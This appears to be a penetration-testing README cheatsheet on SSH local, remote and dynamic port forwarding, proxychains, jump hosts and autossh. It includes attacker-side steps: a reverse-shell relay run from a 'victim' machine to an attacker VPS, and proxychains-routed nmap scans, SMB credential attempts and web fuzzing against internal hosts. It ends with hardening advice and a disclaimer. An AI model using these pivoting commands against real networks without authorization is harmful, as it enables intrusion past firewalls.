# 🚇 SSH Tunneling & Proxychains - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```

<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH Tunneling">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Comprehensive reference for Local (-L), Remote/Reverse (-R), and Dynamic SOCKS (-D) SSH tunnels with Proxychains-ng integration</b>
</p>

---

## 📋 Table of Contents

- [Overview & Tunneling Architectures](#-overview--tunneling-architectures)
- [Local Port Forwarding (`-L`)](#-local-port-forwarding--l)
  - [Syntax & Mechanics](#syntax--mechanics)
  - [Forwarding an Internal Web Interface](#forwarding-an-internal-web-interface)
  - [Forwarding Remote Database Ports](#forwarding-remote-database-ports)
- [Remote / Reverse Port Forwarding (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Syntax & Mechanics](#syntax--mechanics-1)
  - [Exposing Local Reverse Shell Handler](#exposing-local-reverse-shell-handler)
  - [Relaying Inbound Traffic from DMZ](#relaying-inbound-traffic-from-dmz)
- [Dynamic SOCKS Forwarding (`-D`)](#-dynamic-socks-forwarding--d)
  - [Syntax & SOCKS5 Setup](#syntax--socks5-setup)
- [Proxychains-ng Configuration](#-proxychains-ng-configuration)
  - [Configuring `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Routing CLI Tools through Proxychains](#routing-cli-tools-through-proxychains)
- [Multi-Hop Pivoting & Jump Hosts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Persistent Tunnels with Autossh](#-persistent-tunnels-with-autossh)
- [Interactive SSH Escape Sequences (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & Tunneling Architectures

SSH is not merely a remote terminal client; it is an encrypted, bidirectional byte stream transport layer that circumvents restrictive egress/ingress firewall policies:

1. **Local Port Forwarding (`-L`):** Opens a listening port on the **attacker's local machine**; connections are tunneled through SSH and forwarded to a destination reachable from the remote SSH server.
2. **Remote Port Forwarding (`-R`):** Opens a listening port on the **remote SSH server**; incoming connections are tunneled back to the attacker's local machine or internal target.
3. **Dynamic Port Forwarding (`-D`):** Turns the SSH client into a local **SOCKS4/SOCKS5 proxy**, allowing tools (Nmap, Burp Suite, Ffuf, Metasploit) to route arbitrary TCP traffic across the remote network.

```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```

---

## 🔌 Local Port Forwarding (`-L`)

### Syntax & Mechanics
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```

### Forwarding an Internal Web Interface
Access a web administration panel on `172.16.0.15:80` through pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Now browse to `http://127.0.0.1:8080` in your local browser.*

### Forwarding Remote Database Ports
Access an internal PostgreSQL database bound only to `127.0.0.1:5432` on the remote server:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```

> [!NOTE]
> Flags used:
> - `-N`: Do not execute a remote shell command (tunnel only).
> - `-f`: Run in the background immediately before command execution.

---

## 🔄 Remote / Reverse Port Forwarding (`-R`)

### Syntax & Mechanics
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```

### Exposing Local Reverse Shell Handler
From a compromised target machine behind NAT, punch through outbound firewalls to send traffic to your external listener on VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```

### Relaying Inbound Traffic from DMZ
Forward port 8080 on the remote pivot to local port 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```

> [!IMPORTANT]
> To bind remote ports to all interfaces (`0.0.0.0`), the SSH server's `/etc/ssh/sshd_config` must set:
> `GatewayPorts yes` or `GatewayPorts clientspecified`.

---

## 🌐 Dynamic SOCKS Forwarding (`-D`)

### Syntax & SOCKS5 Setup
Create a dynamic SOCKS5 proxy on local port `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```

Verify that the SOCKS proxy is listening:
```bash
ss -tlpn | grep 1080
```

---

## ⚙️ Proxychains-ng Configuration

Proxychains intercepts dynamic library network calls (`connect()`, `gethostbyname()`) via `LD_PRELOAD` to force standard CLI applications through SOCKS/HTTP proxies.

### Configuring `/etc/proxychains4.conf`
Edit the configuration file to point to your SSH Dynamic SOCKS tunnel:

```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```

### Routing CLI Tools through Proxychains
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

---

## 🔀 Multi-Hop Pivoting & Jump Hosts (`-J`)

When traversing multiple segmented firewall boundaries:

```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```

---

## 🔁 Persistent Tunnels with Autossh

When SSH tunnels drop due to network timeout or NAT drops, `autossh` automatically monitors and restarts the SSH connection:

```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```

---

## ⌨️ Interactive SSH Escape Sequences (`~C`)

If you already have an interactive SSH session open and suddenly need to open a port forward without disconnecting:

1. Press `Enter`
2. Type `~C` (Tilde followed by capital C)
3. The prompt changes to `ssh> `
4. Add your forwarding rules on the fly:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
   Or create dynamic SOCKS:
   ```text
   ssh> -D 1080
   ```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Local Port Forward** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Remote Port Forward** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Dynamic SOCKS5 Proxy**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Background Silent Tunnel** | `ssh -f -N -D 1080 user@pivot` |
| **Jump Host Pivot** | `ssh -J user@hop1,user@hop2 target` |
| **Run Tool via Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Persistent Auto-Reconnect** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **On-the-fly Tunnel** | `Enter` then `~C` -> `ssh> -D 1080` |

---

## 🛡️ Defensive Considerations & OPSEC

1. **Disable Port Forwarding in SSHD:** Set `AllowTcpForwarding no` and `PermitTunnel no` in `/etc/ssh/sshd_config` on hardened production systems.
2. **Network Flow Anomaly Detection:** Persistent long-running SSH sessions transferring substantial bi-directional byte streams often indicate interactive tunneling or data exfiltration.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> SSH tunneling and network pivoting must only be performed on networks and systems where explicit written authorization has been obtained. Unauthorized bypassing of perimeter network firewalls is illegal.
